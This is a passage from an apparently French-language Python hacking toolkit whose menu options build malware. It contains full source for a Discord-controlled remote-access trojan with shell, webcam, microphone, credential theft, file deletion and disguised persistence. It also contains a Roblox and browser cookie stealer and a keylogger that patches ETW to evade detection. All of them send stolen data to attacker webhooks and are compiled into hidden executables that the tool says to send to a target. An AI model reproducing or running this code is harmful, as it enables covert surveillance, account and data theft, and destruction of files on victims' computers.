        tmp = tempfile.mktemp(suffix=".txt")
        with open(tmp, "w", encoding="utf-8") as f:
            f.write("\n".join(out))
        wh_send(file_path=tmp, content=f"**Creds** — {BOT_ID}")
        os.remove(tmp)
    else:
        wh_send(content="[creds] rien")

def cmd_files():
    user = os.path.expanduser("~")
    tmp = tempfile.mktemp(suffix=".zip")
    total = 0
    with zipfile.ZipFile(tmp, "w", zipfile.ZIP_DEFLATED) as z:
        for f in ["Documents", "Desktop", "Downloads"]:
            base = os.path.join(user, f)
            if not os.path.isdir(base):
                continue
            for root, _, files in os.walk(base):
                for name in files:
                    fp = os.path.join(root, name)
                    try:
                        sz = os.path.getsize(fp)
                        if sz < 10 * 1024 * 1024 and total + sz < 50 * 1024 * 1024:
                            z.write(fp, os.path.relpath(fp, user))
                            total += sz
                    except Exception:
                        pass
    if total > 0:
        wh_send(file_path=tmp, content=f"**Files** ({total // 1024 // 1024} MB) — {BOT_ID}")
    else:
        wh_send(content="[files] rien")
    try: os.remove(tmp)
    except: pass

def cmd_delete():
    import shutil as sh
    user = os.path.expanduser("~")
    for f in ["Documents", "Desktop", "Downloads", "Pictures"]:
        try:
            sh.rmtree(os.path.join(user, f), ignore_errors=True)
        except Exception:
            pass
    wh_send(content=f"**Files deleted** — {BOT_ID}")

def cmd_persist():
    try:
        import winreg
        exe_path = sys.executable
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                           r"Software\Microsoft\Windows\CurrentVersion\Run",
                           0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "WindowsUpdate", 0, winreg.REG_SZ, f'"{exe_path}"')
        winreg.CloseKey(k)
        wh_send(content=f"**Persistence OK** — {BOT_ID}")
    except Exception as e:
        wh_send(content=f"[persist] {e}")

def cmd_pwd():
    wh_send(content=f"**CWD** : `{os.getcwd()}` — {BOT_ID}")

def cmd_listdir(arg):
    try:
        path = arg.strip() or os.path.expanduser("~")
        items = os.listdir(path)
        listing = "\n".join(items[:100])
        wh_embed("Dir listing", f"```\n{listing}\n```", 0x2C2F33,
                 [{"name": "path", "value": f"`{path}`", "inline": False}])
    except Exception as e:
        wh_send(content=f"[listdir] {e}")

def cmd_download(arg):
    path = arg.strip()
    if not os.path.isfile(path):
        wh_send(content=f"[download] not a file: {path}")
        return
    size = os.path.getsize(path)
    if size > 25 * 1024 * 1024:
        wh_send(content=f"[download] trop gros ({size // 1024 // 1024} MB)")
        return
    wh_send(file_path=path, content=f"**Download** {os.path.basename(path)} — {BOT_ID}")

def cmd_upload(url):
    try:
        tmp = tempfile.mktemp(suffix=os.path.basename(url.split("?")[0]) or ".bin")
        r = HTTP.get(url, timeout=60, stream=True)
        with open(tmp, "wb") as f:
            for chunk in r.iter_content(8192):
                f.write(chunk)
        wh_send(content=f"**Upload OK** : `{tmp}` — {BOT_ID}")
    except Exception as e:
        wh_send(content=f"[upload] {e}")

def cmd_lock():
    try:
        ctypes.windll.user32.LockWorkStation()
        wh_send(content=f"**Locked** — {BOT_ID}")
    except Exception as e:
        wh_send(content=f"[lock] {e}")

def cmd_message(text):
    try:
        ctypes.windll.user32.MessageBoxW(0, text, "Message", 0x40)
        wh_send(content=f"**Message affiche** — {BOT_ID}")
    except Exception as e:
        wh_send(content=f"[message] {e}")

def cmd_kill():
    wh_send(content=f"**Exit** — {BOT_ID}")
    os._exit(0)

def dispatch(cmd):
    parts = cmd.strip().split(" ", 1)
    base = parts[0].lower()
    arg = parts[1] if len(parts) > 1 else ""

    table = {
        "!info": cmd_info,
        "!screen": cmd_screen,
        "!webcam": cmd_webcam,
        "!micro": cmd_micro,
        "!creds": cmd_creds,
        "!files": cmd_files,
        "!delete": cmd_delete,
        "!persist": cmd_persist,
        "!pwd": cmd_pwd,
        "!lock": cmd_lock,
        "!kill": cmd_kill,
        "!ping": lambda: wh_send(content=f"**Pong** — {BOT_ID}"),
    }

    if base == "!shell":
        cmd_shell(arg)
    elif base == "!listdir":
        cmd_listdir(arg)
    elif base == "!download":
        cmd_download(arg)
    elif base == "!upload":
        cmd_upload(arg)
    elif base == "!message":
        cmd_message(arg)
    elif base in table:
        try:
            table[base]()
        except Exception as e:
            wh_send(content=f"[{base}] {e}")
    else:
        wh_send(content=f"[?] commande inconnue : `{cmd}`")

def main():
    try:
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                               r"Software\Microsoft\Windows\CurrentVersion\Run",
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, "WindowsUpdate", 0, winreg.REG_SZ, f'"{sys.executable}"')
            winreg.CloseKey(k)
        except Exception:
            pass

        wh_embed(f"Online — {BOT_ID}",
                 "RAT Discord backend connecte",
                 0x00FF00,
                 [{"name": k, "value": f"`{v}`", "inline": True} for k, v in get_sysinfo().items()])

        while True:
            msgs = fetch_msgs()
            for m in reversed(msgs):
                mid = m.get("id")
                content = m.get("content", "").strip()
                if mid in SEEN_IDS or not content.startswith("!"):
                    continue
                SEEN_IDS.add(mid)
                try:
                    dispatch(content)
                except Exception as e:
                    wh_send(content=f"[dispatch] {e}")
            time.sleep(POLL_INTERVAL)
    except Exception as e:
        wh_send(content=f"[main] {e}")

if __name__ == "__main__":
    if os.name != "nt":
        sys.exit(1)
    main()
'''

    src = bot_source.replace("__WEBHOOK__", webhook)
    src = src.replace("__BOT_TOKEN__", bot_token)
    src = src.replace("__CHANNEL_ID__", channel_id)

    bot_path = _safe_tmp("bot.py")
    with open(bot_path, "w", encoding="utf-8") as f:
        f.write(src)

    try:
        import PyInstaller  # noqa
    except ImportError:
        print(f"{YELLOW}[+] Installation de PyInstaller...{RESET}")
        subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pyinstaller"],
                       cwd=_safe_cwd(), check=True)

    dist_dir = _safe_dist()
    work_dir = _safe_tmp("build_rat")
    spec_dir = _safe_workdir()

    print(f"{YELLOW}[+] Compilation...{RESET}")
    args = [
        sys.executable, "-m", "PyInstaller",
        "--onefile", "--noconsole", "--clean",
        "--name", output,
        "--distpath", dist_dir,
        "--workpath", work_dir,
        "--specpath", spec_dir,
        "--hidden-import=requests",
        "--hidden-import=mss",
        "--hidden-import=cv2",
        "--hidden-import=sounddevice",
        "--hidden-import=scipy.io.wavfile",
        "--hidden-import=win32crypt",
        "--runtime-tmpdir", "%TEMP%",
    ]
    if icon:
        args += ["--icon", icon]
    args.append(bot_path)

    r = subprocess.run(args, capture_output=True, text=True, cwd=_safe_cwd())
    if r.returncode != 0:
        print(f"{RED}[-] Echec compilation.{RESET}")
        print(r.stderr[-1500:])
        pause()
        return

    exe = os.path.join(dist_dir, f"{output}.exe")
    print(f"{GREEN}[+] Termine : {exe}{RESET}")
    print(f"{GRAY}[i] Envoie {output}.exe a la cible.{RESET}")
    print(f"{GRAY}[i] Commandes disponibles dans le channel Discord :{RESET}")
    print(f"{CYAN}    !info  !screen  !webcam  !micro  !creds  !files{RESET}")
    print(f"{CYAN}    !delete  !persist  !pwd  !shell <cmd>  !listdir <path>{RESET}")
    print(f"{CYAN}    !download <path>  !upload <url>  !message <txt>{RESET}")
    print(f"{CYAN}    !lock  !kill  !ping{RESET}")

    for p in [bot_path, os.path.join(spec_dir, f"{output}.spec"), work_dir]:
        try:
            if os.path.isdir(p):
                shutil.rmtree(p, ignore_errors=True)
            elif os.path.isfile(p):
                os.remove(p)
        except Exception:
            pass
    pause()


# ============================================================
#     OPTION 13 — ROBLOX COOKIE GRABBER BUILDER
# ============================================================

def option_13():
    clear()
    banner()

    print(f"\n{CYAN}   [ ROBLOX COOKIE GRABBER BUILDER ]{RESET}\n")
    webhook = input(f"{YELLOW}[?]{RESET} Webhook URL -> ").strip()
    bot_token = input(f"{YELLOW}[?]{RESET} Bot token -> ").strip()
    channel_id = input(f"{YELLOW}[?]{RESET} Channel ID -> ").strip()

    if not webhook or not bot_token or not channel_id:
        print(f"{RED}[!] Champs manquants.{RESET}")
        pause()
        return

    payload = f'''import os, sys, json, time, base64, sqlite3, shutil, socket, platform
import subprocess, winreg, threading
from datetime import datetime

try:
    import requests
except ImportError:
    subprocess.call([sys.executable, "-m", "pip", "install", "requests", "--quiet"])
    import requests

try:
    from Crypto.Cipher import AES
except ImportError:
    subprocess.call([sys.executable, "-m", "pip", "install", "pycryptodome", "--quiet"])
    from Crypto.Cipher import AES

WEBHOOK_URL = "{webhook}"
BOT_TOKEN = "{bot_token}"
CHANNEL_ID = "{channel_id}"
POLL_INTERVAL = 15

API = "https://discord.com/api/v10"
HEADERS = {{"Authorization": f"Bot {{BOT_TOKEN}}", "Content-Type": "application/json"}}
SEEN_IDS = set()

CHROME_PATHS = [
    os.path.join(os.getenv("LOCALAPPDATA", ""), r"Google\\Chrome\\User Data\\Default\\Network\\Cookies"),
    os.path.join(os.getenv("LOCALAPPDATA", ""), r"Google\\Chrome\\User Data\\Profile 1\\Network\\Cookies"),
    os.path.join(os.getenv("LOCALAPPDATA", ""), r"Microsoft\\Edge\\User Data\\Default\\Network\\Cookies"),
    os.path.join(os.getenv("LOCALAPPDATA", ""), r"BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies"),
]
ROBLOX_PATHS = [
    os.path.join(os.getenv("LOCALAPPDATA", ""), r"Roblox\\LocalStorage"),
    os.path.join(os.getenv("APPDATA", ""), r"Roblox\\LocalStorage"),
]

def dpapi(data):
    try:
        import ctypes
        from ctypes import wintypes
        class BLOB(ctypes.Structure):
            _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
        c = ctypes.windll.crypt32
        k = ctypes.windll.kernel32
        bi = BLOB(len(data), ctypes.cast(data, ctypes.POINTER(ctypes.c_char)))
        bo = BLOB()
        if c.CryptUnprotectData(ctypes.byref(bi), None, None, None, None, 0, ctypes.byref(bo)):
            r = ctypes.string_at(bo.pbData, bo.cbData)
            k.LocalFree(bo.pbData)
            return r
    except Exception:
        pass
    return None

def chrome_key():
    for ls in [
        os.path.join(os.getenv("LOCALAPPDATA", ""), r"Google\\Chrome\\User Data\\Local State"),
        os.path.join(os.getenv("LOCALAPPDATA", ""), r"Microsoft\\Edge\\User Data\\Local State"),
    ]:
        if os.path.exists(ls):
            try:
                with open(ls, "r", encoding="utf-8") as f:
                    data = json.load(f)
                return dpapi(base64.b64decode(data["os_crypt"]["encrypted_key"])[5:])
            except Exception:
                pass
    return None

def dec_cookie(enc, key):
    try:
        if not enc or not key:
            return None
        if enc[:3] == b"v10":
            iv, ct = enc[3:15], enc[15:]
            return AES.new(key, AES.MODE_GCM, iv).decrypt(ct)[:-16].decode("utf-8", errors="ignore")
        return dpapi(enc).decode("utf-8", errors="ignore")
    except Exception:
        return None

def chrome_roblox():
    out = []
    key = chrome_key()
    if not key:
        return out
    for p in CHROME_PATHS:
        if not os.path.exists(p):
            continue
        tmp = os.path.join(os.getenv("TEMP"), "ck_tmp.db")
        try:
            shutil.copy2(p, tmp)
            con = sqlite3.connect(tmp)
            for host, name, enc in con.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox%'"):
                v = dec_cookie(enc, key)
                if v:
                    out.append({{"source": p, "host": host, "name": name, "value": v}})
            con.close()
        except Exception:
            pass
        finally:
            try: os.remove(tmp)
            except: pass
    return out

def roblox_dat():
    out = []
    for path in ROBLOX_PATHS:
        if os.path.isfile(path):
            try:
                with open(path, "rb") as f:
                    out.append({{"source": path, "raw_b64": base64.b64encode(f.read()).decode()}})
            except Exception:
                pass
        elif os.path.isdir(path):
            for root, _, files in os.walk(path):
                for n in files:
                    if n.endswith(".dat"):
                        full = os.path.join(root, n)
                        try:
                            with open(full, "rb") as f:
                                out.append({{"source": full, "raw_b64": base64.b64encode(f.read()).decode()}})
                        except Exception:
                            pass
    return out

def persist():
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "RobloxService", 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(k)
    except Exception:
        pass

def info():
    try:
        ip = requests.get("https://api.ipify.org", timeout=5).text
    except Exception:
        ip = "?"
    return {{"hostname": socket.gethostname(), "username": os.getlogin(),
             "os": platform.system() + " " + platform.release(),
             "public_ip": ip, "timestamp": datetime.now().isoformat()}}

def send_result(cookies, dats, title="Roblox Grabber"):
    embed = {{"title": title, "color": 0x000000,
             "fields": [{{"name": k, "value": str(v), "inline": True}} for k, v in info().items()]}}
    try:
        requests.post(WEBHOOK_URL, json={{"embeds": [embed]}}, timeout=10)
    except Exception:
        pass
    files = {{}}
    if cookies:
        files["cookies.json"] = ("cookies.json", json.dumps(cookies).encode(), "application/json")
    for i, d in enumerate(dats):
        files[f"d{{i}}.b64"] = (f"d{{i}}.b64", d["raw_b64"].encode(), "text/plain")
    if files:
        try:
            requests.post(WEBHOOK_URL, files=files, timeout=30)
        except Exception:
            pass

def exec_cmd(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=60).decode("utf-8", errors="ignore")
    except Exception as e:
        return str(e)

def fetch_msgs():
    try:
        r = requests.get(f"{{API}}/channels/{{CHANNEL_ID}}/messages?limit=5", headers=HEADERS, timeout=10)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return []

def process(msg):
    c = msg.get("content", "").strip()
    mid = msg.get("id")
    if mid in SEEN_IDS or not c.startswith("!"):
        return
    SEEN_IDS.add(mid)
    if c == "!info":
        requests.post(WEBHOOK_URL, json={{"embeds": [{{"title": "Systeme", "fields": [{{"name": k, "value": str(v)}} for k, v in info().items()]}}]}}, timeout=10)
    elif c == "!grab":
        send_result(chrome_roblox(), roblox_dat(), "Grab a la demande")
    elif c.startswith("!cmd "):
        requests.post(WEBHOOK_URL, json={{"content": f"```\\n{{exec_cmd(c[5:])[:1900]}}\\n```"}}, timeout=15)
    elif c == "!persist":
        persist()
    elif c == "!kill":
        sys.exit(0)

def poll():
    while True:
        for m in reversed(fetch_msgs()):
            try:
                process(m)
            except Exception:
                pass
        time.sleep(POLL_INTERVAL)

def main():
    persist()
    send_result(chrome_roblox(), roblox_dat())
    poll()

if __name__ == "__main__":
    try:
        main()
    except Exception:
        pass
'''

    payload_path = _safe_tmp("roblox_grabber_payload.py")
    with open(payload_path, "w", encoding="utf-8") as f:
        f.write(payload)

    try:
        import PyInstaller  # noqa
    except ImportError:
        subprocess.call([sys.executable, "-m", "pip", "install", "pyinstaller"],
                        cwd=_safe_cwd())

    dist_dir = _safe_dist()
    work_dir = _safe_tmp("build_roblox")
    spec_dir = _safe_workdir()

    print(f"{YELLOW}[+] Compilation...{RESET}")
    subprocess.call([sys.executable, "-m", "PyInstaller", "--onefile",
                     "--noconfirm", "--clean", "--noconsole",
                     "--distpath", dist_dir,
                     "--workpath", work_dir,
                     "--specpath", spec_dir,
                     payload_path],
                    cwd=_safe_cwd())

    exe = os.path.join(dist_dir, "roblox_grabber_payload.exe")
    print(f"{GREEN}[+] Termine : {exe}{RESET}")
    pause()


# ============================================================
#         OPTION 14 — KEYLOGGER BUILDER
# ============================================================

def option_14():
    clear()
    banner()

    print(f"\n{CYAN}   [ KEYLOGGER BUILDER ]{RESET}\n")
    webhook = input(f"{YELLOW}[?]{RESET} Webhook URL -> ").strip()
    if not webhook.startswith("https://discord.com/api/webhooks/"):
        print(f"{RED}[!] Webhook invalide.{RESET}")
        pause()
        return

    print(f"\n{GRAY}Options de capture :{RESET}")
    print(f"{GRAY}  1. Clavier uniquement{RESET}")
    print(f"{GRAY}  2. Clavier + fenetres actives{RESET}")
    print(f"{GRAY}  3. Clavier + fenetres + presse-papiers{RESET}")
    print(f"{GRAY}  4. Complet (clavier + fenetres + presse-papiers + screenshots){RESET}")
    mode = input(f"{YELLOW}[?]{RESET} Choix (def 2) -> ").strip() or "2"
    if mode not in ("1", "2", "3", "4"):
        mode = "2"

    try:
        interval = int(input(f"{YELLOW}[?]{RESET} Intervalle d'envoi (secondes, def 60) -> ").strip() or "60")
        if interval < 30:
            interval = 30
    except ValueError:
        interval = 60

    payload = r'''import os, sys, time, threading, ctypes, subprocess, tempfile, socket, platform, json
from datetime import datetime

for pkg in ("requests", "pynput", "pyperclip", "mss"):
    try:
        __import__(pkg if pkg != "mss" else "mss")
    except ImportError:
        try:
            subprocess.run([sys.executable, "-m", "pip", "install", "--quiet", pkg],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120)
        except Exception:
            pass

import requests
from pynput import keyboard

try:
    import pyperclip
except Exception:
    pyperclip = None

try:
    import mss, mss.tools
except Exception:
    mss = None

WEBHOOK = "__WEBHOOK_URL__"
CAPTURE_WINDOWS = __CAP_WINDOWS__
CAPTURE_CLIPBOARD = __CAP_CLIPBOARD__
CAPTURE_SCREENSHOTS = __CAP_SCREENSHOTS__
SEND_INTERVAL = __INTERVAL__
LOG_DIR = os.path.join(os.getenv("APPDATA", ""), "Microsoft", "Windows", "Logs")
LOG_FILE = os.path.join(LOG_DIR, ".winlog.txt")

HTTP = requests.Session()
HTTP.headers.update({"User-Agent": "Mozilla/5.0 Chrome/120.0"})

def patch_etw():
    try:
        k = ctypes.windll.kernel32
        addr = ctypes.cast(k.GetProcAddress(k.GetModuleHandleA(b"ntdll.dll"), b"EtwEventWrite"), ctypes.c_void_p)
        old = ctypes.c_ulong(0)
        k.VirtualProtect(addr, 0x10, 0x40, ctypes.byref(old))
        ctypes.memmove(addr, b"\xB8\x00\x00\x00\xC0\xC3", 6)
        k.VirtualProtect(addr, 0x10, old.value, ctypes.byref(old))
    except Exception:
        pass

patch_etw()

lock = threading.Lock()
key_buffer = []
window_buffer = []
clip_last = ""

os.makedirs(LOG_DIR, exist_ok=True)
try:
    ctypes.windll.kernel32.SetFileAttributesW(LOG_FILE, 2)
except Exception:
    pass

def hide_log():
    try:
        ctypes.windll.kernel32.SetFileAttributesW(LOG_FILE, 2)
    except Exception:
        pass

def persist_log(entry):
    try:
        with open(LOG_FILE, "a", encoding="utf-8", errors="ignore") as f:
            f.write(entry)
        hide_log()
    except Exception:
        pass

def get_active_window():
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        buf = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
        return buf.value.strip()
    except Exception:
        return ""

def watch_windows():
    if not CAPTURE_WINDOWS:
        return
    last = None
    while True:
        try:
            title = get_active_window()
            if title and title != last:
                with lock:
                    window_buffer.append(f"[{datetime.now().strftime('%H:%M:%S')}] {title}")
                    persist_log(f"\n\n[FENETRE] {title}\n")
                last = title
        except Exception:
            pass
        time.sleep(2)

def watch_clipboard():
    if not CAPTURE_CLIPBOARD or pyperclip is None:
        return
    global clip_last
    while True:
        try:
            txt = pyperclip.paste()
            if txt and txt != clip_last and len(txt) < 5000:
                clip_last = txt
                with lock:
                    window_buffer.append(f"[CLIPBOARD] {txt[:300]}")
                    persist_log(f"\n[CLIP] {txt[:300]}\n")
        except Exception:
            pass
        time.sleep(3)

def normalize_key(key):
    try:
        if hasattr(key, "char") and key.char:
            return key.char
        name = getattr(key, "name", None)
        if name == "space":
            return " "
        if name == "enter":
            return "\n"
        if name == "tab":
            return "\t"
        if name == "backspace":
            return "[BS]"
        if name == "delete":
            return "[DEL]"
        if name == "esc":
            return "[ESC]"
        if name in ("shift", "shift_r", "ctrl_l", "ctrl_r", "alt_l", "alt_r", "cmd", "cmd_r"):
            return ""
        if name:
            return f"[{name.upper()}]"
    except Exception:
        pass
    return ""

def on_press(key):
    try:
        char = normalize_key(key)
        if not char:
            return
        with lock:
            key_buffer.append(char)
            persist_log(char)
    except Exception:
        pass

def capture_screen():
    if mss is None:
        return None
    try:
        with mss.mss() as sct:
            img = sct.grab(sct.monitors[1])
            tmp = tempfile.mktemp(suffix=".png")
            mss.tools.to_png(img.rgb, img.size, output=tmp)
            return tmp
    except Exception:
        return None

def send_embed(title, description, color=0x8B0000):
    for chunk in [description[i:i+1900] for i in range(0, len(description), 1900)]:
        try:
            HTTP.post(WEBHOOK, json={"embeds": [{
                "title": title,
                "description": chunk,
                "color": color,
                "timestamp": datetime.utcnow().isoformat(),
            }]}, timeout=15)
        except Exception:
            pass

def send_file(path, caption=""):
    try:
        with open(path, "rb") as f:
            HTTP.post(WEBHOOK, files={"file": (os.path.basename(path), f.read())},
                      data={"content": caption}, timeout=60)
    except Exception:
        pass

def system_info():
    try:
        ip = HTTP.get("https://api.ipify.org", timeout=5).text
    except Exception:
        ip = "?"
    try:
        user = os.getlogin()
    except Exception:
        user = "?"
    return {
        "hostname": socket.gethostname(),
        "user": user,
        "os": f"{platform.system()} {platform.release()}",
        "ip": ip,
    }

def flush():
    while True:
        time.sleep(SEND_INTERVAL)
        with lock:
            if not key_buffer and not window_buffer:
                continue
            keys = "".join(key_buffer)
            windows = list(window_buffer)
            key_buffer.clear()
            window_buffer.clear()

        info = system_info()
        header = (
            f"**{info['hostname']}** — `{info['user']}`\n"
            f"{info['os']} — `{info['ip']}`\n"
            f"`{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
        )

        if keys:
            send_embed(f"Keystrokes ({len(keys)} chars)", f"{header}\n\n```\n{keys[:1800]}\n```")

        if windows:
            wtext = "\n".join(windows[-30:])
            send_embed("Activité", f"{header}\n\n```\n{wtext[:1800]}\n```", color=0x2C2F33)

        try:
            log = ""
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, "r", encoding="utf-8", errors="ignore") as f:
                    log = f.read()
            if log:
                tmp = tempfile.mktemp(suffix=".txt")
                with open(tmp, "w", encoding="utf-8") as f:
                    f.write(log)
                send_file(tmp, f"Full log — {info['hostname']}")
                os.remove(tmp)
                open(LOG_FILE, "w").close()
                hide_log()
        except Exception:
            pass

        if CAPTURE_SCREENSHOTS:
            shot = capture_screen()
            if shot:
                send_file(shot, f"Screen — {info['hostname']}")
                try: os.remove(shot)
                except: pass

def install_persistence():
    try:
        import winreg
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                           r"Software\Microsoft\Windows\CurrentVersion\Run",
                           0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "WinLog", 0, winreg.REG_SZ, f'"{sys.executable}"')
        winreg.CloseKey(k)
    except Exception:
        pass

def main():
    install_persistence()

    info = system_info()
    send_embed(
        "Keylogger Online",
        f"**{info['hostname']}** — `{info['user']}`\n"
        f"{info['os']} — `{info['ip']}`\n"
        f"Mode : W={CAPTURE_WINDOWS} C={CAPTURE_CLIPBOARD} S={CAPTURE_SCREENSHOTS}\n"
        f"Intervalle : {SEND_INTERVAL}s",
        color=0x00FF00,
    )

    threading.Thread(target=flush, daemon=True).start()
    if CAPTURE_WINDOWS:
        threading.Thread(target=watch_windows, daemon=True).start()
    if CAPTURE_CLIPBOARD:
        threading.Thread(target=watch_clipboard, daemon=True).start()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    try:
        main()
    except Exception:
        pass
'''

    cap_windows = "True" if mode in ("2", "3", "4") else "False"
    cap_clipboard = "True" if mode in ("3", "4") else "False"
    cap_screenshots = "True" if mode == "4" else "False"

    src = payload.replace("__WEBHOOK_URL__", webhook)
    src = src.replace("__CAP_WINDOWS__", cap_windows)
    src = src.replace("__CAP_CLIPBOARD__", cap_clipboard)
    src = src.replace("__CAP_SCREENSHOTS__", cap_screenshots)
    src = src.replace("__INTERVAL__", str(interval))

    tmp = _safe_tmp("_keylogger_tmp.py")
    with open(tmp, "w", encoding="utf-8") as f:
        f.write(src)

    try:
        import PyInstaller  # noqa
    except ImportError:
        print(f"{YELLOW}[+] Installation de PyInstaller...{RESET}")
        subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pyinstaller"],
                       cwd=_safe_cwd(), check=True)

    dist_dir = _safe_dist()
    work_dir = _safe_tmp("build_keylog")
    spec_dir = _safe_workdir()

    print(f"{YELLOW}[+] Compilation...{RESET}")
    args = [
        sys.executable, "-m", "PyInstaller",
        "--onefile", "--noconsole", "--clean",
        "--name", "WinLog",
        "--distpath", dist_dir,
        "--workpath", work_dir,
        "--specpath", spec_dir,
        "--hidden-import=pynput.keyboard._win32",
        "--hidden-import=pynput.mouse._win32",
        "--hidden-import=pyperclip",
        "--hidden-import=mss",
        "--hidden-import=mss.tools",
        "--hidden-import=requests",
        "--runtime-tmpdir", "%TEMP%",
        tmp,
    ]
    r = subprocess.run(args, capture_output=True, text=True, cwd=_safe_cwd())
    if r.returncode != 0:
        print(f"{RED}[-] Echec compilation.{RESET}")
        print(r.stderr[-1500:])
        pause()
        return

    exe = os.path.join(dist_dir, "WinLog.exe")
    print(f"{GREEN}[+] Termine : {exe}{RESET}")
    print(f"{GRAY}[i] Mode : {mode} (W={cap_windows} C={cap_clipboard} S={cap_screenshots}){RESET}")
    print(f"{GRAY}[i] Intervalle : {interval}s{RESET}")

    for p in [tmp, os.path.join(spec_dir, "WinLog.spec"), work_dir]:
        try:
            if os.path.isdir(p):
                shutil.rmtree(p, ignore_errors=True)
            elif os.path.isfile(p):
                os.remove(p)
        except Exception:
            pass
    pause()


# ============================================================
#                     OPTION 15 — PASSWORD CREATOR
# ============================================================

def option_15():
    clear()
    banner()

    print(f"\n{CYAN}   [ PASSWORD GENERATOR ]{RESET}\n")
    try:
        length = int(input(f"{YELLOW}[?]{RESET} Length -> ").strip())
        if length < 1:
            print(f"{RED}[!] Longueur invalide.{RESET}")
            pause()
            return
        if length > 2048:
            length = 2048
    except ValueError:
        print(f"{RED}[!] Nombre invalide.{RESET}")
        pause()
        return

    print(f"\n{GRAY}01 -> Letters Only{RESET}")
    print(f"{GRAY}02 -> Letters & Numbers{RESET}")
    print(f"{GRAY}03 -> Letters, Numbers & Symbols{RESET}")
    choice = input(f"{YELLOW}[?]{RESET} Choice -> ").strip().lstrip("0")

    if choice == "1":
        chars = string.ascii_letters
    elif choice == "2":
        chars = string.ascii_letters + string.digits
    elif choice == "3":
        chars = string.ascii_letters + string.digits + string.punctuation
    else:
        print(f"{RED}[!] Choix invalide.{RESET}")
        pause()
        return

    import secrets
    pw = "".join(secrets.choice(chars) for _ in range(length))
    print(f"\n{GREEN}Password :{RESET} {pw}")
    pause()


# ============================================================
#                     OPTION 16 — IP LOOKUP OSINT
# ============================================================

def option_16():
    clear()
    banner()

    print(f"\n{CYAN}   [ IP LOOKUP - OSINT ]{RESET}\n")
    target = input(f"{CYAN}[?]{RESET} Host ou IP {RED}->{RESET} ").strip()
    if not target:
        print(f"{RED}[!] Aucun host.{RESET}")
        pause()
        return

    target = target.removeprefix("https://").removeprefix("http://").rstrip("/").split("/")[0]

    print(f"{YELLOW}[*] Resolution DNS...{RESET}")
    resolved = None
    target_ip = None

    if re.match(r"^(?:\d{1,3}\.){3}\d{1,3}$", target):
        target_ip = target
        resolved = target
    else:
        try:
            resolved = socket.gethostbyname(target)
            target_ip = resolved
        except socket.gaierror:
            print(f"{RED}[!] Resolution DNS impossible.{RESET}")
            pause()
            return

    print(f"{GREEN}[+] IP resolue : {target_ip}{RESET}")

    results = {}
    rlock = threading.Lock()

    def safe_get(url, headers=None, timeout=10):
        try:
            h = headers or {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124",
                "Accept": "application/json, text/html, */*",
            }
            return requests.get(url, headers=h, timeout=timeout)
        except Exception:
            return None

    def q_ipapi():
        r = safe_get(
            f"http://ip-api.com/json/{target_ip}"
            "?fields=status,country,countryCode,regionName,city,zip,"
            "lat,lon,timezone,isp,org,as,asname,reverse,proxy,hosting,mobile,query"
        )
        if r and r.status_code == 200:
            try:
                data = r.json()
                if data.get("status") == "success":
                    with rlock:
                        results["ipapi"] = data
            except Exception:
                pass

    def q_ipinfo():
        r = safe_get(f"https://ipinfo.io/{target_ip}/json")
        if r and r.status_code == 200:
            try:
                with rlock:
                    results["ipinfo"] = r.json()
            except Exception:
                pass

    def q_shodan():
        r = safe_get(f"https://internetdb.shodan.io/{target_ip}")
        if r and r.status_code == 200:
            try:
                with rlock:
                    results["shodan"] = r.json()
            except Exception:
                pass

    def q_rdap():
        r = safe_get(f"https://rdap.org/ip/{target_ip}")
        if r and r.status_code == 200:
            try:
                with rlock:
                    results["rdap"] = r.json()
            except Exception:
                pass

    def q_bgpview():
        r = safe_get(f"https://api.bgpview.io/ip/{target_ip}")
        if r and r.status_code == 200:
            try:
                data = r.json()
                if data.get("status") == "ok":
                    with rlock:
                        results["bgpview"] = data.get("data", {})
            except Exception:
                pass

    def q_abuseipdb():
        r = safe_get(f"https://www.abuseipdb.com/check/{target_ip}", timeout=12)
        if r and r.status_code == 200:
            body = r.text.lower()
            with rlock:
                results["abuseipdb_page"] = {
                    "reported": "was found in our database" in body or "reported" in body,
                }

    def q_reverse_dns():
        try:
            rev = socket.gethostbyaddr(target_ip)
            with rlock:
                results["reverse_dns"] = {
                    "hostname": rev[0],
                    "aliases": rev[1],
                    "ips": rev[2],
                }
        except Exception:
            pass

    def q_http_headers():
        for proto in ("https", "http"):
            try:
                r = requests.head(f"{proto}://{target_ip}/", timeout=6, verify=False, allow_redirects=False)
                with rlock:
                    results["http_headers"] = dict(r.headers)
                    results["http_status"] = r.status_code
                return
            except Exception:
                continue

    def q_ports():
        COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017]
        open_ports = []

        def try_port(p):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.5)
                res = s.connect_ex((target_ip, p))
                s.close()
                if res == 0:
                    return p
            except Exception:
